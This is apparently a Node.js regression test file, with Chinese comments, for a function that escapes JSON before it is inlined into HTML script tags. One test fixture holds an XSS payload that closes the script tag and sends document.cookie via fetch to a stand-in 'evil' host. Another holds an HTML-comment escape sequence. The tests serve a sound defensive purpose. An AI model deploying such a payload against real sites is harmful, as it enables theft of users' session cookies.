// safe-inline-json.mjs 的回归测试：验证内联进 <script> 时已转义，且 JSON.parse 后数据无损还原。
import { test } from "node:test";
import assert from "node:assert/strict";
import { jsonForInlineScript } from "./safe-inline-json.mjs";

test("含 </script> 的描述被转义，无法闭合 script 标签", () => {
  const evil = '你 的 </script><script>fetch("https://evil/e?"+document.cookie)</script>';
  const out = jsonForInlineScript({ description: evil });
  // 产物中不得出现可闭合 script 标签的原始字符序列
  assert.ok(!out.includes("</script>"), "产物不应包含 </script>");
  assert.ok(!out.includes("<script"), "产物不应包含 <script");
  // 转义后经 JSON.parse 应原样还原为原始文本（数据内容无损）
  assert.equal(JSON.parse(out).description, evil);
});

test("含 HTML 注释逃逸序列被阻断", () => {
  const out = jsonForInlineScript({ name: "<!--<script>alert(1)</script>" });
  assert.ok(!out.includes("<!--"), "产物不应包含 <!--");
  assert.ok(!out.includes("</script>"));
});

test("普通未转义字符保持不变，JSON 结构完整", () => {
  const value = { name: '博客写作', zh: '文案', tags: ["doc-writing", "docs"], n: 3, ok: true };
  const out = jsonForInlineScript(value);
  assert.deepEqual(JSON.parse(out), value);
  assert.ok(out.includes("博客写作")); // 中文与正常字符原样保留
});

test("含 HTML 实体 & 被转义后在浏览器端还原", () => {
  const value = { url: "https://example.com/a?b=1&c=2" };
  const out = jsonForInlineScript(value);
  assert.ok(!out.includes("&"), "裸 & 应转义为 \\u0026");
  assert.equal(JSON.parse(out).url, "https://example.com/a?b=1&c=2");
});